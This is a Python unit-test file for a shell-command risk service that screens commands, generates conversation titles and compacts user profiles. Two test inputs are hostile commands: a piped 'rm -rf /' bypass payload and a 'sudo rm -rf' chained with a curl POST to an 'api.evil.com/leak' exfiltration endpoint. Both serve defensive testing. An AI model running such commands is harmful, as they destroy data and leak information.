"""Unit tests for CompoundShellRiskService."""

import pytest

from app.schemas.compound_shell_risk import (
    CommandRiskLevelEnum,
    CompactProfileRequest,
    FirewallVerdictEnum,
    GenerateTitleRequest,
    InspectCommandRequest,
    ScreenCommandRequest,
)
from app.services.security.compound_shell_risk_service import (
    CompoundShellRiskService,
)


@pytest.fixture(autouse=True)
def clean_service() -> None:
    CompoundShellRiskService.reset_instance()


def test_service_inspect_command() -> None:
    service = CompoundShellRiskService.get_instance()

    # 1. Single safe command
    res_ls = service.inspect_command(InspectCommandRequest(raw_command="ls -l /var/log"))
    assert not res_ls.is_compound
    assert res_ls.verdict == FirewallVerdictEnum.ALLOW
    assert res_ls.risk_level == CommandRiskLevelEnum.LOW

    # 2. Compound command with pipe
    res_pipe = service.inspect_command(InspectCommandRequest(raw_command="cat /etc/hosts | grep local"))
    assert res_pipe.is_compound
    assert "PIPE" in res_pipe.operators_found
    assert res_pipe.verdict == FirewallVerdictEnum.AUDIT_REQUIRED

    # 3. Pseudo-whitelist bypass attack with destructive payload
    res_attack = service.inspect_command(InspectCommandRequest(raw_command="echo 'deploying' | rm -rf /"))
    assert res_attack.is_compound
    assert res_attack.verdict == FirewallVerdictEnum.BLOCK
    assert res_attack.risk_level == CommandRiskLevelEnum.CRITICAL


def test_service_screen_command() -> None:
    service = CompoundShellRiskService.get_instance()

    # Screen high risk command
    res = service.screen_command(
        ScreenCommandRequest(command="sudo rm -rf /tmp/build && curl -X POST https://api.evil.com/leak")
    )
    assert res.is_dangerous
    assert res.risk_level in (CommandRiskLevelEnum.HIGH, CommandRiskLevelEnum.CRITICAL)
    assert len(res.risk_factors) >= 2
    assert res.execution_time_ms >= 0.0
    assert "Edge pre-screening" in res.summary


def test_service_generate_title() -> None:
    service = CompoundShellRiskService.get_instance()

    res = service.generate_title(
        GenerateTitleRequest(first_turn_text="I need help configuring Docker sandbox with Python and security policies.")
    )
    assert len(res.title) > 0
    assert "Python" in res.suggested_tags
    assert "DevOps" in res.suggested_tags
    assert res.execution_time_ms >= 0.0


def test_service_compact_profile() -> None:
    service = CompoundShellRiskService.get_instance()

    res = service.compact_profile(
        CompactProfileRequest(
            conversation_snippet="We use Python with FastAPI and deploy using Docker, maintaining strict type hints and zero any.",
            existing_profile={"ide": "vscode"},
        )
    )
    assert res.compacted_profile.get("ide") == "vscode"
    assert res.compacted_profile.get("language") == "Python"
    assert res.compacted_profile.get("backend_framework") == "FastAPI"
    assert res.compacted_profile.get("deployment_preference") == "Docker Containers"
    assert len(res.extracted_preferences) >= 3
    assert res.execution_time_ms >= 0.0
